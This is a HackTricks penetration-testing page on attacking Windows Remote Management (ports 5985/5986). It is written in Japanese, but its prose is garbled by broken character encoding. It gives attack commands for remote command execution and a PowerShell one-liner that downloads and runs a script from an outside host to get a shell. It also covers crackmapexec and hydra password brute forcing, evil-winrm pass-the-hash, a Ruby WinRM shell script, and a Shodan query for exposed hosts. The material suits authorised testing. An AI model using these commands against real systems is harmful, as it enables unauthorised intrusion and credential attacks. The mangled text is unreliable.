# 5985,5986 - WinRMã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€** [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«æ·±ãå…¥ã‚Šè¾¼ã‚€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã™ã‚‹

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã®é€Ÿã„ãƒšãƒ¼ã‚¹ã«ã¤ã„ã¦ã„ã

**æœ€æ–°ã®ç™ºè¡¨**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°ã«ã¤ã„ã¦ã®æƒ…å ±ã‚’å…¥æ‰‹ã™ã‚‹

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx)ã¯ã€Microsoftã«ã‚ˆã£ã¦å¼·èª¿ã•ã‚Œã¦ã„ã‚‹**ãƒ—ãƒ­ãƒˆã‚³ãƒ«**ã§ã‚ã‚Šã€HTTP(S)ã‚’ä»‹ã—ã¦**Windowsã‚·ã‚¹ãƒ†ãƒ ã®ãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†**ã‚’å¯èƒ½ã«ã™ã‚‹ã‚‚ã®ã§ã€ãã®éç¨‹ã§SOAPã‚’æ´»ç”¨ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯åŸºæœ¬çš„ã«WMIã«ã‚ˆã£ã¦å‹•ä½œã—ã€WMIæ“ä½œã®ãŸã‚ã®HTTPãƒ™ãƒ¼ã‚¹ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¨ã—ã¦è¡¨ã‚Œã¾ã™ã€‚

ãƒã‚·ãƒ³ä¸Šã«WinRMãŒå­˜åœ¨ã™ã‚‹ã¨ã€ä»–ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§SSHãŒæ©Ÿèƒ½ã™ã‚‹ã®ã¨åŒæ§˜ã«ã€PowerShellã‚’ä»‹ã—ãŸç°¡å˜ãªãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚WinRMãŒç¨¼åƒã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€ç‰¹å®šã®ãƒãƒ¼ãƒˆãŒé–‹ã‹ã‚Œã¦ã„ã‚‹ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¾ã™:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

ä¸Šè¨˜ã®ãƒªã‚¹ãƒˆã‹ã‚‰ã®ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ¼ãƒˆã¯ã€WinRMãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã€ã—ãŸãŒã£ã¦ãƒªãƒ¢ãƒ¼ãƒˆã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é–‹å§‹ã™ã‚‹è©¦ã¿ã‚’è¨±å¯ã—ã¾ã™ã€‚

### **WinRMã‚»ãƒƒã‚·ãƒ§ãƒ³ã®é–‹å§‹**

PowerShellã‚’WinRMã«è¨­å®šã™ã‚‹ã«ã¯ã€Microsoftã®`Enable-PSRemoting`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆãŒæ´»èºã—ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã‚’ãƒªãƒ¢ãƒ¼ãƒˆPowerShellã‚³ãƒãƒ³ãƒ‰ã‚’å—ã‘å…¥ã‚Œã‚‹ã‚ˆã†ã«è¨­å®šã—ã¾ã™ã€‚æ˜‡æ ¼ã•ã‚ŒãŸPowerShellã‚¢ã‚¯ã‚»ã‚¹ã§ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã“ã®æ©Ÿèƒ½ã‚’æœ‰åŠ¹ã«ã—ã€ä»»æ„ã®ãƒ›ã‚¹ãƒˆã‚’ä¿¡é ¼ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã§ã¯ã€`trustedhosts` æ§‹æˆã«ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã‚’è¿½åŠ ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯é‡è¦ãªè€ƒæ…®äº‹é …ãŒã‚ã‚‹ãŸã‚ã€æ…é‡ã«è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€æ”»æ’ƒè€…ã®ãƒã‚·ãƒ³ã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¿ã‚¤ãƒ—ã‚’ã€ŒPublicã€ã‹ã‚‰ã€ŒWorkã€ã«å¤‰æ›´ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã•ã‚‰ã«ã€WinRM ã¯ `wmic` ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦**ãƒªãƒ¢ãƒ¼ãƒˆã§æœ‰åŠ¹åŒ–**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ã«å®Ÿè¨¼ã•ã‚Œã¦ã„ã¾ã™:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
ã“ã®æ–¹æ³•ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€WinRMã®ãƒªãƒ¢ãƒ¼ãƒˆè¨­å®šãŒå¯èƒ½ã«ãªã‚Šã€é éš”ã‹ã‚‰Windowsãƒã‚·ãƒ³ã‚’ç®¡ç†ã™ã‚‹æŸ”è»Ÿæ€§ãŒå‘ä¸Šã—ã¾ã™ã€‚


### æ§‹æˆæ¸ˆã¿ã‹ã©ã†ã‹ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹

æ”»æ’ƒãƒã‚·ãƒ³ã®è¨­å®šã‚’æ¤œè¨¼ã™ã‚‹ãŸã‚ã«ã€`Test-WSMan`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒWinRMã‚’é©åˆ‡ã«æ§‹æˆã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨wsmidã«é–¢ã™ã‚‹è©³ç´°ãŒè¡¨ç¤ºã•ã‚Œã€æ­£å¸¸ã«æ§‹æˆã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒç¤ºã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã¯ã€æ§‹æˆã•ã‚ŒãŸã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¨æœªæ§‹æˆã®ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®å ´åˆã®æœŸå¾…ã•ã‚Œã‚‹å‡ºåŠ›ã‚’ç¤ºã™ä¾‹ã§ã™ï¼š

- **é©åˆ‡ã«**æ§‹æˆã•ã‚ŒãŸã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®å ´åˆã€å‡ºåŠ›ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```bash
Test-WSMan <target-ip>
```
ä»¥ä¸‹ã¯ã€ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨wsmidã«é–¢ã™ã‚‹æƒ…å ±ã‚’å«ã‚€ã€WinRMãŒæ­£ã—ãè¨­å®šã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã™ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã§ã™ã€‚

![](<../.gitbook/assets/image (161) (1).png>)

- é€†ã«ã€WinRMã«è¨­å®šã•ã‚Œã¦ã„ãªã„ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®å ´åˆã€é©åˆ‡ãªWinRMã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ãŒãªã„ã“ã¨ã‚’ç¤ºã™è©³ç´°ãªæƒ…å ±ãŒãªã„ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

![](<../.gitbook/assets/image (162).png>)

### ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œ

ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³ã§ãƒªãƒ¢ãƒ¼ãƒˆã§`ipconfig`ã‚’å®Ÿè¡Œã—ã€ãã®å‡ºåŠ›ã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

ã‚ãªãŸã¯**Invoke-Command**ã‚’ä»‹ã—ã¦ç¾åœ¨ã®PSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ã«**enumeration**ã¨ã„ã†é–¢æ•°ãŒã‚ã‚‹ã¨ä»®å®šã—ã€ãã‚Œã‚’ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã§å®Ÿè¡Œã—ãŸã„å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œ
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### é€†ã‚·ã‚§ãƒ«ã‚’å–å¾—
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### PSã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹

ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ãªPowerShellã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€`Enter-PSSession`ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯ã€ã€Œè¢«å®³è€…ã€å†…ã®æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆwsmprovhostï¼‰ã§å®Ÿè¡Œã•ã‚Œã¾ã™**

### **WinRMã‚’å¼·åˆ¶çš„ã«ã‚ªãƒ¼ãƒ—ãƒ³ã«ã™ã‚‹**

PSãƒªãƒ¢ãƒ¼ãƒˆãŠã‚ˆã³WinRMã‚’ä½¿ç”¨ã™ã‚‹ãŒã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãŒæ§‹æˆã•ã‚Œã¦ã„ãªã„å ´åˆã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦æœ‰åŠ¹ã«ã§ãã¾ã™ï¼š
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ä¿å­˜ã¨å¾©å…ƒ

ã“ã‚Œã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã§è¨€èªãŒåˆ¶ç´„ã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
ã“ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³å†…ã§ã¯ã€_Invoke-Command_ ã‚’ä½¿ç”¨ã—ã¦ PS ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### ã‚¨ãƒ©ãƒ¼

æ¬¡ã®ã‚¨ãƒ©ãƒ¼ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆï¼š

`enter-pssession : ãƒªãƒ¢ãƒ¼ãƒˆ ã‚µãƒ¼ãƒãƒ¼ 10.10.10.175 ã¸ã®æ¥ç¶šã«å¤±æ•—ã—ã¾ã—ãŸã€‚æ¬¡ã®ã‚¨ãƒ©ãƒ¼ ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸ: WinRM ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯è¦æ±‚ã‚’å‡¦ç†ã§ãã¾ã›ã‚“ã€‚èªè¨¼ã‚¹ã‚­ãƒ¼ãƒ ãŒ Kerberos ã¨ç•°ãªã‚‹å ´åˆã€ã¾ãŸã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ãŒãƒ‰ãƒ¡ã‚¤ãƒ³ã«å‚åŠ ã—ã¦ã„ãªã„å ´åˆã¯ã€HTTPS ãƒˆãƒ©ãƒ³ã‚¹ãƒãƒ¼ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã‹ã€å®›å…ˆãƒã‚·ãƒ³ã‚’ TrustedHosts æ§‹æˆè¨­å®šã«è¿½åŠ ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚TrustedHosts ã‚’æ§‹æˆã™ã‚‹ã«ã¯ã€winrm.cmd ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚TrustedHosts ãƒªã‚¹ãƒˆã«ã‚ã‚‹ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã¯èªè¨¼ã•ã‚Œãªã„å ´åˆãŒã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦è©³ç´°æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™: winrm help configã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€about_Remote_Troubleshooting ãƒ˜ãƒ«ãƒ— ãƒˆãƒ”ãƒƒã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚`

ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§æ¬¡ã®æ‰‹é †ã‚’è©¦ã—ã¦ãã ã•ã„ï¼ˆ[ã“ã¡ã‚‰](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)ã‹ã‚‰ã®æƒ…å ±ï¼‰:
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ã€çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚Šã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«æ·±ãå…¥ã‚Šè¾¼ã‚€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã‚’æœ€æ–°æƒ…å ±ã§è¿½ã„ã‹ã‘ã¾ã—ã‚‡ã†

**æœ€æ–°ã®ãŠçŸ¥ã‚‰ã›**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã«ã¤ã„ã¦ã®æƒ…å ±ã‚’å…¥æ‰‹ã—ã¾ã—ã‚‡ã†

**[Discord](https://discord.com/invite/N3FrSbmwdy)** ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

## Linux ã§ã® WinRM æ¥ç¶š

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

WinRM ã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã«ã¯æ³¨æ„ãŒå¿…è¦ã§ã™ã€‚
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### æ‚ªæ„ã®ã‚ã‚‹winrmã®ä½¿ç”¨
```ruby
gem install evil-winrm
```
**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**ã¯ã“ã¡ã‚‰ã®GitHubã§å…¥æ‰‹å¯èƒ½: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
### evil-winrmã‚’ä½¿ç”¨ã—ã¦IPv6ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ¥ç¶šã™ã‚‹ã«ã¯ã€_**/etc/hosts**_å†…ã«ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’IPv6ã‚¢ãƒ‰ãƒ¬ã‚¹ã«è¨­å®šã—ã¦ã€ãã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«æ¥ç¶šã—ã¾ã™ã€‚

### evil-winrmã§ãƒãƒƒã‚·ãƒ¥ã‚’æ¸¡ã™
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
### PS-docker ãƒã‚·ãƒ³ã®ä½¿ç”¨

PS-docker ãƒã‚·ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ”»æ’ƒè€…ã¯ Docker ã‚³ãƒ³ãƒ†ãƒŠå†…ã§ WinRM ã‚µãƒ¼ãƒ“ã‚¹ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ Windows ãƒã‚·ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ WinRM ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä»‹ã—ã¦ Windows ãƒã‚·ãƒ³ã«å¯¾ã—ã¦æ§˜ã€…ãªæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã¨ãªã‚Šã¾ã™ã€‚
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### ãƒ«ãƒ“ãƒ¼ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ä½¿ç”¨

**ã“ã“ã‹ã‚‰æŠ½å‡ºã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰: [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)**
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## References

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Automatic Commands
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

